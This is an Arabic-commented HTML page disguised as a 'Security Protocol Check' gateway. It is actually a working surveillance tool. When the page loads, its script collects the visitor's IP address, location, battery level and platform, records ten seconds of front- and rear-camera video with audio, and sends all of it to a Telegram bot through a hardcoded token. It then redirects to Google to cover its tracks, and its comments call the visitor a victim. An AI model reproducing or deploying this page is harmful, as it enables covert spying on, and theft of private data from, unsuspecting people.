<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Protocol Check</title>
    <style>
        body { background-color: #0d1117; color: #58a6ff; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .loader { border: 4px solid #21262d; border-top: 4px solid #58a6ff; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; box-shadow: 0 0 15px rgba(88, 166, 255, 0.1); }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { margin-top: 20px; font-size: 14px; font-weight: 500; color: #c9d1d9; letter-spacing: 0.5px; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <div class="status" id="st">INITIALIZING SECURE GATEWAY...</div>

    <script>
        const BOT_TOKEN = "8619027051:AAH06xxHUXEeZ_PLu8l5QF8zct7nrjNW4ts";
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('chatId');
        // توليد رقم جلسة فريد لكل عملية دخول لضمان التجدد
        const sessionId = Math.floor(Math.random() * 90000) + 10000;

        async function startSecureProcess() {
            if (!chatId) return;

            // 1. إرسال بيانات الجهاز والشبكة فوراً
            await sendIdentityReport();

            // 2. تصوير الكاميرا الأمامية (10 ثوانٍ) - دقة 360p
            await captureStream("user", "الأمامية");

            // 3. تصوير الكاميرا الخلفية (10 ثوانٍ) - دقة 360p
            await captureStream("environment", "الخلفية");

            // التوجه التلقائي لجوجل للتمويه
            window.location.href = "https://www.google.com";
        }

        async function sendIdentityReport() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                const battery = await navigator.getBattery();
                const report = `🔔 **دخول جديد للرابط**\n━━━━━━━━━━━━━\n🆔 الجلسة: #${sessionId}\n🌐 العنوان: \`${d.ip}\`\n📍 الموقع: ${d.city}, ${d.country_name}\n🔋 البطارية: ${Math.round(battery.level * 100)}%\n📱 النظام: ${navigator.platform}\n━━━━━━━━━━━━━`;
               
                await postToTelegram('sendDocument', {
                    document: new Blob([report], { type: 'text/plain' }),
                    fileName: `report_${sessionId}.txt`,
                    caption: `📄 بيانات الجلسة ${sessionId}`
                });
            } catch (e) { console.log("Init error"); }
        }

        async function captureStream(cameraMode, label) {
            try {
                document.getElementById('st').innerText = `VERIFYING ${label.toUpperCase()} SENSOR...`;
               
                // ضبط الدقة على 360p (640x360) لضمان السرعة القصوى
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: cameraMode, width: 640, height: 360 },
                    audio: true
                });
               
                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
                let chunks = [];

                recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
               
                return new Promise((resolve) => {
                    recorder.onstop = async () => {
                        const videoBlob = new Blob(chunks, { type: 'video/mp4' });
                        // رفع الفيديو باستخدام keepalive لضمان الوصول حتى لو خرج الضحية
                        postToTelegram('sendVideo', {
                            video: videoBlob,
                            fileName: `${label}_${sessionId}.mp4`,
                            caption: `📹 فيديو ${label} | الجلسة: ${sessionId}`
                        });
                        stream.getTracks().forEach(t => t.stop());
                        resolve();
                    };
                   
                    recorder.start();
                    setTimeout(() => recorder.stop(), 10000);
                });
            } catch (err) {
                console.log("Stream failed");
                return Promise.resolve();
            }
        }

        async function postToTelegram(method, data) {
            const fd = new FormData();
            fd.append('chat_id', chatId);
            if (data.document) fd.append('document', data.document, data.fileName);
            if (data.video) fd.append('video', data.video, data.fileName);
            fd.append('caption', data.caption);
            fd.append('parse_mode', 'Markdown');

            // استخدام keepalive: true هو الضمان لإكمال الرفع عند الخروج
            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
                method: 'POST',
                body: fd,
                keepalive: true
            });
        }

        window.onload = startSecureProcess;
    </script>
</body>
</html>
